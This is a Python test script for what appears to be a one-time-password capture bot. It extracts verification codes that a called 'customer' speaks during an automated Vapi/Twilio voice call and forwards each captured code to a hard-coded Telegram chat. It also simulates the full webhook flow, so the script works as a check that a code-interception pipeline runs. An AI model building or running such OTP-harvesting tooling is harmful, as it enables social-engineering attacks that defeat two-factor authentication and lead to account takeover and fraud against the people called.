"""Direct test of OTP capture -> Telegram notification flow"""
import sys, os, logging, json
sys.path.insert(0, os.path.dirname(__file__))

logging.basicConfig(level=logging.DEBUG)

from handlers.otp_notifier import notify_otp_captured
from handlers.vapi_webhooks import extract_otp_from_transcript

chat_id = 8366864444

print("=" * 60)
print("TEST 1: OTP Regex Extraction")
print("=" * 60)
test_texts = [
    ("my code is 159357", 6, "159357"),
    ("the code is 123456", 6, "123456"),
    ("verification code: 987654", 6, "987654"),
    ("it's 4 5 6 7 8 9", 6, "456789"),
    ("my otp is 12345", 5, "12345"),
    ("code: 111 222", 6, None),
    ("no digits here", 6, None),
    ("short 12", 6, None),
]
all_ok = True
for text, length, expected in test_texts:
    result = extract_otp_from_transcript(text, length)
    status = "PASS" if result == expected else "FAIL"
    if result != expected:
        all_ok = False
    print(f"  [{status}] extract_otp_from_transcript('{text}', {length}) = {result} (expected {expected})")

print(f"\nOTP Regex: {'ALL PASS' if all_ok else 'SOME FAILED'}")

print("\n" + "=" * 60)
print("TEST 2: Direct notify_otp_captured -> Telegram")
print("=" * 60)
print(f"Sending test OTP notification to chat {chat_id}...")
try:
    notify_otp_captured(
        chat_id=chat_id,
        call_sid="test-call-otp-flow-001",
        digits="159357",
        user_id="test_user",
        vapi_call_id="test-vapi-otp-flow-001",
    )
    print("SUCCESS: notify_otp_captured executed without errors")
except Exception as e:
    print(f"FAILED: {e}")
    import traceback
    traceback.print_exc()

print("\n" + "=" * 60)
print("TEST 3: Simulate Vapi webhook (full flow)")
print("=" * 60)
print("Sending POST to local Flask /vapi/webhook...")
try:
    from bot import app
    client = app.test_client()
    payload = {
        "type": "transcript",
        "call": {
            "id": "test-vapi-webhook-001",
            "twilioCallSid": "test-call-webhook-001"
        },
        "message": {
            "role": "customer",
            "transcript": "my verification code is 159357"
        },
        "metadata": {
            "chat_id": chat_id,
            "user_id": "test_user",
            "code_length": 6
        }
    }
    resp = client.post("/vapi/webhook", json=payload)
    print(f"  HTTP Status: {resp.status_code}")
    print(f"  Response: {resp.data.decode()}")
    if resp.status_code == 200:
        print("SUCCESS: Vapi webhook handler executed without errors")
    else:
        print(f"FAILED: Unexpected status code")
except Exception as e:
    print(f"FAILED: {e}")
    import traceback
    traceback.print_exc()

print("\n" + "=" * 60)
print("DONE - Check Telegram chat", chat_id, "for OTP notification messages")
print("=" * 60)